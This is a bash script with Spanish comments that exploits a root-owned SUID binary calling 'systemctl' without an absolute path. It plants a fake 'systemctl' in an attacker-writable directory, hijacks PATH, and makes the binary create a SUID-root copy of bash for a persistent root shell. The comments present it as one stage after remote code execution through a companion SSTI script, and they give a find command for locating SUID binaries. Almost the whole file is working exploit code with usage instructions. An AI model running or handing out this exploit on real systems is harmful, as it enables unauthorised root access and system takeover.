#!/bin/bash
# privesc_path_hijack.sh
#
# Explota un binario SUID (propiedad de root) que invoca internamente
# `system("systemctl status <servicio>")` SIN ruta absoluta y sin
# sanear la variable de entorno PATH heredada del proceso invocador.
#
# Al anteponer un directorio controlado por el atacante al PATH, con
# un ejecutable propio llamado "systemctl", el binario SUID termina
# ejecutando nuestro código con privilegios de root.
#
# Requisitos:
#   - Ejecución de comandos como el usuario propietario original
#     (p. ej. vía rce_via_ssti.sh) con permiso para escribir en HIJACK_DIR.
#   - El binario SUID debe estar localizado previamente, p. ej.:
#       find / -perm -4000 -type f 2>/dev/null
#
# Uso:
#   HIJACK_DIR=/tmp SUID_BINARY=/path/al/binario ./privesc_path_hijack.sh

set -euo pipefail

HIJACK_DIR="${HIJACK_DIR:-/tmp}"
SUID_BINARY="${SUID_BINARY:?Define SUID_BINARY, la ruta del binario SUID vulnerable}"

# 1. "systemctl" falso: copia bash y le pone el bit SUID
cat > "${HIJACK_DIR}/systemctl" << 'EOF'
#!/bin/bash
cp /bin/bash "${HIJACK_DIR:-/tmp}/rootbash"
chmod 4755 "${HIJACK_DIR:-/tmp}/rootbash"
EOF
chmod +x "${HIJACK_DIR}/systemctl"

# 2. Disparamos el binario SUID con el PATH secuestrado
PATH="${HIJACK_DIR}:$PATH" "${SUID_BINARY}"

# 3. Verificación
if [ -u "${HIJACK_DIR}/rootbash" ]; then
  echo "[+] Privesc OK: ${HIJACK_DIR}/rootbash tiene bit SUID de root."
  echo "    Uso: ${HIJACK_DIR}/rootbash -p -c 'comando como root'"
else
  echo "[-] No se generó el binario SUID; revisa si SUID_BINARY es vulnerable."
fi
